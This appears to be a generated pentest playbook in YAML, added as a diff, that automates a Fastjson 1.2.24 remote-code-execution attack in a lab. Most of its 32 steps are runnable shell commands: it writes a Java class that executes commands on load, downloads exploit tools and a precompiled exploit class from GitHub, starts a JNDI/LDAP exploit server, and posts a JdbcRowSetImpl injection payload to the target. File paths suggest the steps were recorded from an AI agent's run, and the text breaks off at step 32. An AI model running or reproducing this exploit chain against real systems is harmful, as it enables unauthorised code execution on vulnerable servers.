@@ -1,0 +1,1830 @@
+playbook:
+  id: 1-2-24-rce
+  name: 1.2.24-rce SysField Playbook
+  description: Generated from CVELab atom (unknown).
+  scenario_type: pentest
+  author: CVELab
+  version: '1.0'
+  mitre_attack: {}
+variables:
+  target_ip: '{{ target_ip }}'
+  target_port: 8090
+  requirements: {}
+monitor:
+  preset: standard
+actors:
+  attacker:
+    node: attacker
+    description: CVELab attacker node
+    capabilities:
+    - network
+    - exploit
+steps:
+- id: 01-1-2-24-rce-check-the-fastjson-service-on-target
+  stage: execution
+  actor: attacker
+  description: Check the fastjson service on target
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: 'mkdir -p /tmp/cvelab-sysfield
+
+      (curl -s http://{{ target_ip }}:8090/) > /tmp/cvelab-sysfield/01-1-2-24-rce-check-the-fastjson-service-on-target.out
+      2>&1
+
+      status=$?
+
+      cat /tmp/cvelab-sysfield/01-1-2-24-rce-check-the-fastjson-service-on-target.out
+
+      exit $status'
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/01-1-2-24-rce-check-the-fastjson-service-on-target.out
+      op: write
+  timeout: 120
+- id: 02-1-2-24-rce-test-post-to-fastjson-service
+  stage: execution
+  actor: attacker
+  description: Test POST to fastjson service
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: 'mkdir -p /tmp/cvelab-sysfield
+
+      (curl -s -X POST http://{{ target_ip }}:8090/ -H "Content-Type: application/json"
+      -d ''{"name":"hello", "age":20}'') > /tmp/cvelab-sysfield/02-1-2-24-rce-test-post-to-fastjson-service.out
+      2>&1
+
+      status=$?
+
+      cat /tmp/cvelab-sysfield/02-1-2-24-rce-test-post-to-fastjson-service.out
+
+      exit $status'
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/02-1-2-24-rce-test-post-to-fastjson-service.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 01-1-2-24-rce-check-the-fastjson-service-on-target
+- id: 03-1-2-24-rce-check-if-java-is-available
+  stage: execution
+  actor: attacker
+  description: Check if Java is available
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: 'mkdir -p /tmp/cvelab-sysfield
+
+      (which java && java -version 2>&1 || echo "Java not found") > /tmp/cvelab-sysfield/03-1-2-24-rce-check-if-java-is-available.out
+      2>&1
+
+      status=$?
+
+      cat /tmp/cvelab-sysfield/03-1-2-24-rce-check-if-java-is-available.out
+
+      exit $status'
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/03-1-2-24-rce-check-if-java-is-available.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 02-1-2-24-rce-test-post-to-fastjson-service
+- id: 04-1-2-24-rce-check-python-version
+  stage: execution
+  actor: attacker
+  description: Check Python version
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: 'mkdir -p /tmp/cvelab-sysfield
+
+      (which python3 && python3 --version) > /tmp/cvelab-sysfield/04-1-2-24-rce-check-python-version.out
+      2>&1
+
+      status=$?
+
+      cat /tmp/cvelab-sysfield/04-1-2-24-rce-check-python-version.out
+
+      exit $status'
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/04-1-2-24-rce-check-python-version.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 03-1-2-24-rce-check-if-java-is-available
+- id: 05-1-2-24-rce-get-my-container-s-ip-address
+  stage: execution
+  actor: attacker
+  description: Get my container's IP address
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: 'mkdir -p /tmp/cvelab-sysfield
+
+      (hostname -I 2>/dev/null || ip addr show 2>/dev/null | grep ''inet '' | awk
+      ''{print $2}'') > /tmp/cvelab-sysfield/05-1-2-24-rce-get-my-container-s-ip-address.out
+      2>&1
+
+      status=$?
+
+      cat /tmp/cvelab-sysfield/05-1-2-24-rce-get-my-container-s-ip-address.out
+
+      exit $status'
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/05-1-2-24-rce-get-my-container-s-ip-address.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 04-1-2-24-rce-check-python-version
+- id: 06-1-2-24-rce-check-for-pre-existing-tools
+  stage: execution
+  actor: attacker
+  description: Check for pre-existing tools
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: 'mkdir -p /tmp/cvelab-sysfield
+
+      (ls /opt/ /root/ /tmp/ 2>/dev/null | head -50) > /tmp/cvelab-sysfield/06-1-2-24-rce-check-for-pre-existing-tools.out
+      2>&1
+
+      status=$?
+
+      cat /tmp/cvelab-sysfield/06-1-2-24-rce-check-for-pre-existing-tools.out
+
+      exit $status'
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/06-1-2-24-rce-check-for-pre-existing-tools.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 05-1-2-24-rce-get-my-container-s-ip-address
+- id: 07-1-2-24-rce-search-for-marshalsec-jar
+  stage: execution
+  actor: attacker
+  description: Search for marshalsec JAR
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: 'mkdir -p /tmp/cvelab-sysfield
+
+      (find / -name "marshalsec*" -type f 2>/dev/null | head -5) > /tmp/cvelab-sysfield/07-1-2-24-rce-search-for-marshalsec-jar.out
+      2>&1
+
+      status=$?
+
+      cat /tmp/cvelab-sysfield/07-1-2-24-rce-search-for-marshalsec-jar.out
+
+      exit $status'
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/07-1-2-24-rce-search-for-marshalsec-jar.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 06-1-2-24-rce-check-for-pre-existing-tools
+- id: 08-1-2-24-rce-create-and-compile-malicious-java-class
+  stage: execution
+  actor: attacker
+  description: Create and compile malicious Java class
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: "mkdir -p /tmp/cvelab-sysfield\n(mkdir -p /tmp/exploit && cd /tmp/exploit\
+      \ && cat > TouchFile.java << 'JAVAEOF'\nimport java.lang.Runtime;\nimport java.lang.Process;\n\
+      \npublic class TouchFile {\n    static {\n        try {\n            Runtime\
+      \ rt = Runtime.getRuntime();\n            String[] commands = {\"touch\", \"\
+      /tmp/success\"};\n            Process pc = rt.exec(commands);\n            pc.waitFor();\n\
+      \        } catch (Exception e) {\n            // do nothing\n        }\n   \
+      \ }\n}\nJAVAEOF\njavac TouchFile.java && echo \"Compiled successfully\" && ls\
+      \ -la TouchFile.class) > /tmp/cvelab-sysfield/08-1-2-24-rce-create-and-compile-malicious-java-class.out\
+      \ 2>&1\nstatus=$?\ncat /tmp/cvelab-sysfield/08-1-2-24-rce-create-and-compile-malicious-java-class.out\n\
+      exit $status"
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/08-1-2-24-rce-create-and-compile-malicious-java-class.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 07-1-2-24-rce-search-for-marshalsec-jar
+- id: 09-1-2-24-rce-check-for-jdk-installation
+  stage: execution
+  actor: attacker
+  description: Check for JDK installation
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: 'mkdir -p /tmp/cvelab-sysfield
+
+      (apt list --installed 2>/dev/null | grep -i jdk; dpkg -l | grep -i jdk 2>/dev/null;
+      find /usr -name "javac" 2>/dev/null) > /tmp/cvelab-sysfield/09-1-2-24-rce-check-for-jdk-installation.out
+      2>&1
+
+      status=$?
+
+      cat /tmp/cvelab-sysfield/09-1-2-24-rce-check-for-jdk-installation.out
+
+      exit $status'
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/09-1-2-24-rce-check-for-jdk-installation.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 08-1-2-24-rce-create-and-compile-malicious-java-class
+- id: 10-1-2-24-rce-install-jdk-for-javac
+  stage: execution
+  actor: attacker
+  description: Install JDK for javac
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: 'mkdir -p /tmp/cvelab-sysfield
+
+      (apt-get install -y openjdk-25-jdk 2>&1 | tail -5) > /tmp/cvelab-sysfield/10-1-2-24-rce-install-jdk-for-javac.out
+      2>&1
+
+      status=$?
+
+      cat /tmp/cvelab-sysfield/10-1-2-24-rce-install-jdk-for-javac.out
+
+      exit $status'
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/10-1-2-24-rce-install-jdk-for-javac.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 09-1-2-24-rce-check-for-jdk-installation
+- id: 11-1-2-24-rce-download-pre-built-marshalsec-jar
+  stage: execution
+  actor: attacker
+  description: Download pre-built marshalsec JAR
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: 'mkdir -p /tmp/cvelab-sysfield
+
+      (cd /tmp/exploit && curl -sL "https://github.com/RandomRobbieBF/marshalsec-jar/raw/main/marshalsec-0.0.3-SNAPSHOT-all.jar"
+      -o marshalsec-0.0.3-SNAPSHOT-all.jar && ls -la marshalsec-0.0.3-SNAPSHOT-all.jar)
+      > /tmp/cvelab-sysfield/11-1-2-24-rce-download-pre-built-marshalsec-jar.out 2>&1
+
+      status=$?
+
+      cat /tmp/cvelab-sysfield/11-1-2-24-rce-download-pre-built-marshalsec-jar.out
+
+      exit $status'
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/11-1-2-24-rce-download-pre-built-marshalsec-jar.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 10-1-2-24-rce-install-jdk-for-javac
+- id: 12-1-2-24-rce-try-to-install-python-jndi-exploit-tool
+  stage: execution
+  actor: attacker
+  description: Try to install Python JNDI exploit tool
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: 'mkdir -p /tmp/cvelab-sysfield
+
+      (pip install jndi-injection-exploit 2>&1 || pip install jndi 2>&1 || echo "Not
+      found in pip") > /tmp/cvelab-sysfield/12-1-2-24-rce-try-to-install-python-jndi-exploit-tool.out
+      2>&1
+
+      status=$?
+
+      cat /tmp/cvelab-sysfield/12-1-2-24-rce-try-to-install-python-jndi-exploit-tool.out
+
+      exit $status'
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/12-1-2-24-rce-try-to-install-python-jndi-exploit-tool.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 11-1-2-24-rce-download-pre-built-marshalsec-jar
+- id: 13-1-2-24-rce-clone-python-based-jndi-exploit-tool
+  stage: execution
+  actor: attacker
+  description: Clone Python-based JNDI exploit tool
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: 'mkdir -p /tmp/cvelab-sysfield
+
+      (cd /tmp/exploit && git clone --depth 1 https://github.com/kozmer/log4j-shell-poc.git
+      2>&1 | tail -5) > /tmp/cvelab-sysfield/13-1-2-24-rce-clone-python-based-jndi-exploit-tool.out
+      2>&1
+
+      status=$?
+
+      cat /tmp/cvelab-sysfield/13-1-2-24-rce-clone-python-based-jndi-exploit-tool.out
+
+      exit $status'
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/13-1-2-24-rce-clone-python-based-jndi-exploit-tool.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 12-1-2-24-rce-try-to-install-python-jndi-exploit-tool
+- id: 14-1-2-24-rce-try-single-file-compilation-with-java
+  stage: execution
+  actor: attacker
+  description: Try single-file compilation with Java
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: 'mkdir -p /tmp/cvelab-sysfield
+
+      (cd /tmp/exploit && java TouchFile.java 2>&1) > /tmp/cvelab-sysfield/14-1-2-24-rce-try-single-file-compilation-with-java.out
+      2>&1
+
+      status=$?
+
+      cat /tmp/cvelab-sysfield/14-1-2-24-rce-try-single-file-compilation-with-java.out
+
+      exit $status'
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/14-1-2-24-rce-try-single-file-compilation-with-java.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 13-1-2-24-rce-clone-python-based-jndi-exploit-tool
+- id: 15-1-2-24-rce-compile-java-class-with-single-file-source-mode
+  stage: execution
+  actor: attacker
+  description: Compile Java class with single-file source mode
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: 'mkdir -p /tmp/cvelab-sysfield
+
+      (cd /tmp/exploit && java TouchFile.java 2>&1 && ls -la TouchFile.class) > /tmp/cvelab-sysfield/15-1-2-24-rce-compile-java-class-with-single-file-source-mode.out
+      2>&1
+
+      status=$?
+
+      cat /tmp/cvelab-sysfield/15-1-2-24-rce-compile-java-class-with-single-file-source-mode.out
+
+      exit $status'
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/15-1-2-24-rce-compile-java-class-with-single-file-source-mode.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 14-1-2-24-rce-try-single-file-compilation-with-java
+- id: 16-1-2-24-rce-search-for-javac-in-jvm-paths
+  stage: execution
+  actor: attacker
+  description: Search for javac in JVM paths
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: 'mkdir -p /tmp/cvelab-sysfield
+
+      (find /usr/lib/jvm -name "javac" 2>/dev/null; ls /usr/lib/jvm/ 2>/dev/null;
+      update-alternatives --list java 2>/dev/null; readlink -f $(which java) 2>/dev/null)
+      > /tmp/cvelab-sysfield/16-1-2-24-rce-search-for-javac-in-jvm-paths.out 2>&1
+
+      status=$?
+
+      cat /tmp/cvelab-sysfield/16-1-2-24-rce-search-for-javac-in-jvm-paths.out
+
+      exit $status'
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/16-1-2-24-rce-search-for-javac-in-jvm-paths.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 15-1-2-24-rce-compile-java-class-with-single-file-source-mode
+- id: 17-1-2-24-rce-download-jdk-deb-package
+  stage: execution
+  actor: attacker
+  description: Download JDK deb package
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: 'mkdir -p /tmp/cvelab-sysfield
+
+      (apt-get download openjdk-25-jdk-headless 2>&1 | tail -5; ls openjdk-25-jdk-headless*.deb
+      2>/dev/null) > /tmp/cvelab-sysfield/17-1-2-24-rce-download-jdk-deb-package.out
+      2>&1
+
+      status=$?
+
+      cat /tmp/cvelab-sysfield/17-1-2-24-rce-download-jdk-deb-package.out
+
+      exit $status'
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/17-1-2-24-rce-download-jdk-deb-package.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 16-1-2-24-rce-search-for-javac-in-jvm-paths
+- id: 18-1-2-24-rce-download-pre-compiled-exploit-class
+  stage: execution
+  actor: attacker
+  description: Download pre-compiled Exploit.class
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: 'mkdir -p /tmp/cvelab-sysfield
+
+      (curl -sL "https://raw.githubusercontent.com/kozmer/log4j-shell-poc/main/Exploit.class"
+      -o /tmp/exploit/TouchFile.class 2>&1 && xxd /tmp/exploit/TouchFile.class | head
+      -3 && ls -la /tmp/exploit/TouchFile.class) > /tmp/cvelab-sysfield/18-1-2-24-rce-download-pre-compiled-exploit-class.out
+      2>&1
+
+      status=$?
+
+      cat /tmp/cvelab-sysfield/18-1-2-24-rce-download-pre-compiled-exploit-class.out
+
+      exit $status'
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/18-1-2-24-rce-download-pre-compiled-exploit-class.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 17-1-2-24-rce-download-jdk-deb-package
+- id: 19-1-2-24-rce-search-for-available-jdk-packages
+  stage: execution
+  actor: attacker
+  description: Search for available JDK packages
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: 'mkdir -p /tmp/cvelab-sysfield
+
+      (apt-cache search openjdk 2>/dev/null | grep -i jdk | head -10) > /tmp/cvelab-sysfield/19-1-2-24-rce-search-for-available-jdk-packages.out
+      2>&1
+
+      status=$?
+
+      cat /tmp/cvelab-sysfield/19-1-2-24-rce-search-for-available-jdk-packages.out
+
+      exit $status'
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/19-1-2-24-rce-search-for-available-jdk-packages.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 18-1-2-24-rce-download-pre-compiled-exploit-class
+- id: 20-1-2-24-rce-check-for-eclipse-java-compiler
+  stage: execution
+  actor: attacker
+  description: Check for Eclipse Java Compiler
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: 'mkdir -p /tmp/cvelab-sysfield
+
+      (which ecj 2>/dev/null; dpkg -l 2>/dev/null | grep -i eclipse; find / -name
+      "ecj*" 2>/dev/null | head -5) > /tmp/cvelab-sysfield/20-1-2-24-rce-check-for-eclipse-java-compiler.out
+      2>&1
+
+      status=$?
+
+      cat /tmp/cvelab-sysfield/20-1-2-24-rce-check-for-eclipse-java-compiler.out
+
+      exit $status'
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/20-1-2-24-rce-check-for-eclipse-java-compiler.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 19-1-2-24-rce-search-for-available-jdk-packages
+- id: 21-1-2-24-rce-try-to-download-pre-compiled-touchfile-class-from-github
+  stage: execution
+  actor: attacker
+  description: Try to download pre-compiled TouchFile.class from GitHub
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: 'mkdir -p /tmp/cvelab-sysfield
+
+      (curl -sL "https://github.com/RandomRobbieBF/marshalsec-jar/raw/main/TouchFile.class"
+      -o /tmp/exploit/TouchFile.class 2>&1 && wc -c /tmp/exploit/TouchFile.class)
+      > /tmp/cvelab-sysfield/21-1-2-24-rce-try-to-download-pre-compiled-touchfile-class-from-github.out
+      2>&1
+
+      status=$?
+
+      cat /tmp/cvelab-sysfield/21-1-2-24-rce-try-to-download-pre-compiled-touchfile-class-from-github.out
+
+      exit $status'
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/21-1-2-24-rce-try-to-download-pre-compiled-touchfile-class-from-github.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 20-1-2-24-rce-check-for-eclipse-java-compiler
+- id: 22-1-2-24-rce-verify-if-downloaded-file-is-a-valid-class-file
+  stage: execution
+  actor: attacker
+  description: Verify if downloaded file is a valid class file
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: 'mkdir -p /tmp/cvelab-sysfield
+
+      (xxd /tmp/exploit/TouchFile.class 2>/dev/null | head -3 || hexdump -C /tmp/exploit/TouchFile.class
+      2>/dev/null | head -5 || file /tmp/exploit/TouchFile.class) > /tmp/cvelab-sysfield/22-1-2-24-rce-verify-if-downloaded-file-is-a-valid-class-file.out
+      2>&1
+
+      status=$?
+
+      cat /tmp/cvelab-sysfield/22-1-2-24-rce-verify-if-downloaded-file-is-a-valid-class-file.out
+
+      exit $status'
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/22-1-2-24-rce-verify-if-downloaded-file-is-a-valid-class-file.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 21-1-2-24-rce-try-to-download-pre-compiled-touchfile-class-from-github
+- id: 23-1-2-24-rce-check-file-type-and-magic-bytes
+  stage: execution
+  actor: attacker
+  description: Check file type and magic bytes
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: 'mkdir -p /tmp/cvelab-sysfield
+
+      (file /tmp/exploit/TouchFile.class && head -c 4 /tmp/exploit/TouchFile.class
+      | od -A x -t x1z) > /tmp/cvelab-sysfield/23-1-2-24-rce-check-file-type-and-magic-bytes.out
+      2>&1
+
+      status=$?
+
+      cat /tmp/cvelab-sysfield/23-1-2-24-rce-check-file-type-and-magic-bytes.out
+
+      exit $status'
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/23-1-2-24-rce-check-file-type-and-magic-bytes.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 22-1-2-24-rce-verify-if-downloaded-file-is-a-valid-class-file
+- id: 24-1-2-24-rce-check-magic-bytes-of-class-file
+  stage: execution
+  actor: attacker
+  description: Check magic bytes of class file
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: 'mkdir -p /tmp/cvelab-sysfield
+
+      (head -c 4 /tmp/exploit/TouchFile.class | od -A x -t x1z) > /tmp/cvelab-sysfield/24-1-2-24-rce-check-magic-bytes-of-class-file.out
+      2>&1
+
+      status=$?
+
+      cat /tmp/cvelab-sysfield/24-1-2-24-rce-check-magic-bytes-of-class-file.out
+
+      exit $status'
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/24-1-2-24-rce-check-magic-bytes-of-class-file.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 23-1-2-24-rce-check-file-type-and-magic-bytes
+- id: 25-1-2-24-rce-find-jar-files-in-jvm
+  stage: execution
+  actor: attacker
+  description: Find JAR files in JVM
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: 'mkdir -p /tmp/cvelab-sysfield
+
+      (find /usr/lib/jvm -name "*.jar" 2>/dev/null | head -10) > /tmp/cvelab-sysfield/25-1-2-24-rce-find-jar-files-in-jvm.out
+      2>&1
+
+      status=$?
+
+      cat /tmp/cvelab-sysfield/25-1-2-24-rce-find-jar-files-in-jvm.out
+
+      exit $status'
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/25-1-2-24-rce-find-jar-files-in-jvm.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 24-1-2-24-rce-check-magic-bytes-of-class-file
+- id: 26-1-2-24-rce-start-planning-class-file-generation
+  stage: execution
+  actor: attacker
+  description: Start planning class file generation
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: 'mkdir -p /tmp/cvelab-sysfield
+
+      (cd /tmp/exploit && python3 -c "
+
+      import struct
+
+
+      # Generate a minimal Java class file with a static initializer
+
+      # that runs Runtime.getRuntime().exec(''touch /tmp/success'')
+
+
+      # This is complex. Let me try a different approach.
+
+      # Use Java''s built-in JShell or scripting capabilities
+
+      print(''Trying alternative...'')
+
+      ") > /tmp/cvelab-sysfield/26-1-2-24-rce-start-planning-class-file-generation.out
+      2>&1
+
+      status=$?
+
+      cat /tmp/cvelab-sysfield/26-1-2-24-rce-start-planning-class-file-generation.out
+
+      exit $status'
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/26-1-2-24-rce-start-planning-class-file-generation.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 25-1-2-24-rce-find-jar-files-in-jvm
+- id: 27-1-2-24-rce-download-jndi-injection-exploit-pre-built-jar
+  stage: execution
+  actor: attacker
+  description: Download JNDI-Injection-Exploit pre-built JAR
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: 'mkdir -p /tmp/cvelab-sysfield
+
+      (cd /tmp/exploit && curl -sL "https://github.com/welk1n/JNDI-Injection-Exploit/releases/download/v1.0/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar"
+      -o JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar && ls -la JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar)
+      > /tmp/cvelab-sysfield/27-1-2-24-rce-download-jndi-injection-exploit-pre-built-jar.out
+      2>&1
+
+      status=$?
+
+      cat /tmp/cvelab-sysfield/27-1-2-24-rce-download-jndi-injection-exploit-pre-built-jar.out
+
+      exit $status'
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/27-1-2-24-rce-download-jndi-injection-exploit-pre-built-jar.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 26-1-2-24-rce-start-planning-class-file-generation
+- id: 28-1-2-24-rce-start-jndi-injection-exploit-server
+  stage: execution
+  actor: attacker
+  description: Start JNDI-Injection-Exploit server
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: 'mkdir -p /tmp/cvelab-sysfield
+
+      (cd /tmp/exploit && java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C
+      "touch /tmp/success" -A "{{ target_ip }}" &
+
+      sleep 5
+
+      echo "--- Server started ---") > /tmp/cvelab-sysfield/28-1-2-24-rce-start-jndi-injection-exploit-server.out
+      2>&1
+
+      status=$?
+
+      cat /tmp/cvelab-sysfield/28-1-2-24-rce-start-jndi-injection-exploit-server.out
+
+      exit $status'
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/28-1-2-24-rce-start-jndi-injection-exploit-server.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 27-1-2-24-rce-download-jndi-injection-exploit-pre-built-jar
+- id: 29-1-2-24-rce-check-exploit-server-output
+  stage: execution
+  actor: attacker
+  description: Check exploit server output
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: 'mkdir -p /tmp/cvelab-sysfield
+
+      (sleep 5 && cat /tmp/claude-1000/-workspace/c48e80ab-ac35-46b9-b85a-d67a9606fb1d/tasks/bej0flag1.output
+      2>/dev/null) > /tmp/cvelab-sysfield/29-1-2-24-rce-check-exploit-server-output.out
+      2>&1
+
+      status=$?
+
+      cat /tmp/cvelab-sysfield/29-1-2-24-rce-check-exploit-server-output.out
+
+      exit $status'
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/29-1-2-24-rce-check-exploit-server-output.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 28-1-2-24-rce-start-jndi-injection-exploit-server
+- id: 30-1-2-24-rce-send-fastjson-rce-payload-using-ldap-jndi-injection
+  stage: execution
+  actor: attacker
+  description: Send Fastjson RCE payload using LDAP JNDI injection
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: 'mkdir -p /tmp/cvelab-sysfield
+
+      (curl -s -X POST http://{{ target_ip }}:8090/ -H "Content-Type: application/json"
+      -d ''{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{
+      target_ip }}:1389/gqxm8b","autoCommit":true}}'') > /tmp/cvelab-sysfield/30-1-2-24-rce-send-fastjson-rce-payload-using-ldap-jndi-injection.out
+      2>&1
+
+      status=$?
+
+      cat /tmp/cvelab-sysfield/30-1-2-24-rce-send-fastjson-rce-payload-using-ldap-jndi-injection.out
+
+      exit $status'
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/30-1-2-24-rce-send-fastjson-rce-payload-using-ldap-jndi-injection.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 29-1-2-24-rce-check-exploit-server-output
+- id: 31-1-2-24-rce-check-exploit-server-logs-for-jndi-connection
+  stage: execution
+  actor: attacker
+  description: Check exploit server logs for JNDI connection
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: 'mkdir -p /tmp/cvelab-sysfield
+
+      (cat /tmp/claude-1000/-workspace/c48e80ab-ac35-46b9-b85a-d67a9606fb1d/tasks/bej0flag1.output
+      2>/dev/null) > /tmp/cvelab-sysfield/31-1-2-24-rce-check-exploit-server-logs-for-jndi-connection.out
+      2>&1
+
+      status=$?
+
+      cat /tmp/cvelab-sysfield/31-1-2-24-rce-check-exploit-server-logs-for-jndi-connection.out
+
+      exit $status'
+  expected_output:
+    exit_code: 0
+  postconditions:
+    files:
+    - path: /tmp/cvelab-sysfield/31-1-2-24-rce-check-exploit-server-logs-for-jndi-connection.out
+      op: write
+  timeout: 120
+  dependencies:
+  - 30-1-2-24-rce-send-fastjson-rce-payload-using-ldap-jndi-injection
+- id: 32-1-2-24-rce-stop-the-previous-exploit-server
+  stage: execution
+  actor: attacker
+  description: Stop the previous exploit server
+  mitre:
+    tactic: execution
+    technique: ''
+    technique_name: execution
+  executor:
+    type: direct
+    command: 'mkdir -p /tmp/cvelab-sysfield
+
+      (pkill -f JNDI-Injection-Exploit 2>/dev/null; sleep 1; echo "killed") > /tmp/cvelab-sysfield/32-1-2-24-rce-stop-the-previous-exploit-server.out
+      2>&1
+
+      status=$?
+
+      cat /tmp/cvelab-sysfield/32-1-2-24-rce-stop-the-previous-exploit-server.out
